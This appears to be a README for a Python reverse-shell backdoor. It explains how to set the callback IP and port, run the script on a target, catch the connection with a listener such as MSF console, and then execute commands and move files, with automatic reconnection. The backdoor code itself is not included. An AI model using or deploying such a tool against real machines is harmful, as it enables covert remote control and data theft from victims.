# Kali-Linux-Backdoor

This script is a simple remote administration tool that establishes a reverse shell connection between a target machine and a kali linux machine. It allows the kali linux machine to utilize a server paired with this backdoor script to execute commands on the remote machine such as upload and download files, navigate through the target machines file system etc.

## Prerequisites

Before using this script, ensure that you have the following:

- Python 3.x installed on both the client and server machines.
- Knowledge of the IP address and port where the server will be listening.

## Usage

1. Update the IP address and port number in the `connection()` function to match the server's IP address and port.
   s.connect(('192.168.x.xxx',55xx))  # Update IP address and port number
2. Run the script on the target machine and the server on the kali machine.
3. Run a listener on the server machine to receive the incoming connection. Such as those offered by the MSF console.
4. Once the connection is established, you can interact with the remote machine through commands such as:
quit: Terminate the remote connection.
clear: Clear the screen.
cd [directory]: Change the current working directory on the remote machine.
download [file]: Upload a file from the remote machine to the client machine.
upload [file]: Download a file from the client machine to the remote machine.
Any other command will be executed on the remote machine, and the result will be sent back to the client.
Note: The script automatically attempts to reconnect every 20 seconds if the connection is lost.

## Disclaimer
This script is intended for educational and authorized testing purposes only. Unauthorized use of this script is strictly prohibited. Use at your own risk. The author assumes no responsibility for any misuse or damage caused by this script.
